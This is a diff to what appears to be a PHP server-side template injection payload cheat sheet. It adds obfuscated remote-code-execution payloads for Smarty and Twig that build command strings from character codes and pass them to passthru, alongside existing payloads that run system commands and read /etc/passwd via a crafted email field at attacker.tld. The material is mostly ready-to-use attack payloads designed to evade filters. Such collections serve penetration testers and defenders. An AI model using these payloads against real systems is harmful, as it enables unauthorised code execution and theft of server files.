@@ -6,12 +6,15 @@
 
 - [Templating Libraries](#templating-libraries)
 - [Universal Payloads](#universal-payloads)
+- [Blade](#blade)
 - [Smarty](#smarty)
+    - [Smarty - Code Execution with Obfuscation](#smarty---code-execution-with-obfuscation)
 - [Twig](#twig)
     - [Twig - Basic Injection](#twig---basic-injection)
     - [Twig - Template Format](#twig---template-format)
     - [Twig - Arbitrary File Reading](#twig---arbitrary-file-reading)
     - [Twig - Code Execution](#twig---code-execution)
+    - [Twig - Code Execution with Obfuscation](#twig---code-execution-with-obfuscation)
 - [Latte](#latte)
     - [Latte - Basic Injection](#latte---basic-injection)
     - [Latte - Code Execution](#latte---code-execution)
@@ -69,6 +72,8 @@ The string `id` is generated with `{{implode(null,array_map(chr(99).chr(104).chr
 {{passthru(implode(null,array_map(chr(99).chr(104).chr(114),[105,100])))}}
 ```
 
+Reference and explanation of payload can be found [yeswehack/server-side-template-injection-exploitation](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation).
+
 ---
 
 ## Smarty
@@ -85,6 +90,18 @@ The string `id` is generated with `{{implode(null,array_map(chr(99).chr(104).chr
 {system('ls')} // compatible v3, deprecated in v5
 {system('cat index.php')} // compatible v3, deprecated in v5
 ```
+
+### Smarty - Code Execution with Obfuscation
+
+By employing the variable modifier `cat`, individual characters are concatenated to form the string "id" as follows: `{chr(105)|cat:chr(100)}`.
+
+Execute system comman (command: `id`):
+
+```php
+{{passthru(implode(Null,array_map(chr(99)|cat:chr(104)|cat:chr(114),[105,100])))}}
+```
+
+Reference and explanation of payload can be found [yeswehack/server-side-template-injection-exploitation](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation).
 
 ---
 
@@ -166,6 +183,22 @@ Example with an email passing FILTER_VALIDATE_EMAIL PHP.
 POST /subscribe?0=cat+/etc/passwd HTTP/1.1
 email="{{app.request.query.filter(0,0,1024,{'options':'system'})}}"@attacker.tld
 ```
+
+### Twig - Code Execution with Obfuscation
+
+Twig's block feature and built-in `_charset` variable can be nesting can be used to produced the payload (command: `id`)
+
+```twig
+{%block U%}id000passthru{%endblock%}{%set x=block(_charset|first)|split(000)%}{{[x|first]|map(x|last)|join}}
+```
+
+The following payload, which harnesses the built-in `_context` variable, also achieves RCE – provided that the template engine performs a double-rendering process:
+
+```twig
+{{id~passthru~_context|join|slice(2,2)|split(000)|map(_context|join|slice(5,8))}}
+```
+
+Reference and explanation of payload can be found [yeswehack/server-side-template-injection-exploitation](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation).
 
 ---
 
@@ -307,6 +340,6 @@ layout template:
 
 ## References
 
-- [Limitations are just an illusion – advanced server-side template exploitation with RCE everywhere - YesWeHack - March 24, 2025](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation)
+- [Limitations are just an illusion – advanced server-side template exploitation with RCE everywhere - Brumens - March 24, 2025](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation)
 - [Server Side Template Injection (SSTI) via Twig escape handler - March 21, 2024](https://github.com/getgrav/grav/security/advisories/GHSA-2m7x-c7px-hp58)
 - [Successful Errors: New Code Injection and SSTI Techniques - Vladislav Korchagin - January 03, 2026](https://github.com/vladko312/Research_Successful_Errors/blob/main/README.md)
